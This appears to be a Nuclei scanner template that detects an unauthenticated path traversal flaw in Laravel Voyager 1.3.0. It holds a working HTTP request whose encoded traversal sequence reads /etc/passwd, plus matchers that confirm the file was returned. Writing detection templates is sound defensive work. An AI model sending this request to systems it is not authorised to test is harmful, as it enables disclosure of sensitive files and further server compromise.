id: laravel-voyager-path-traversal
info:
  name: Laravel Voyager Path Traversal
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Voyager is a Laravel background management extension package that provides CRUD operations, media management, menu construction, data management, and other operations. There is a path traversal vulnerability in Voyager version 1.3.0, which enables arbitrary file reading (no login is required), which can lead to disclosure of sensitive information and even further control of the server.
  tags: path-traversal,file-inclusion
  reference:
    - https://laravel.com/
http:
  - raw:
      - |
        GET /admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F/etc/passwd HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ":/bin"
        part: body
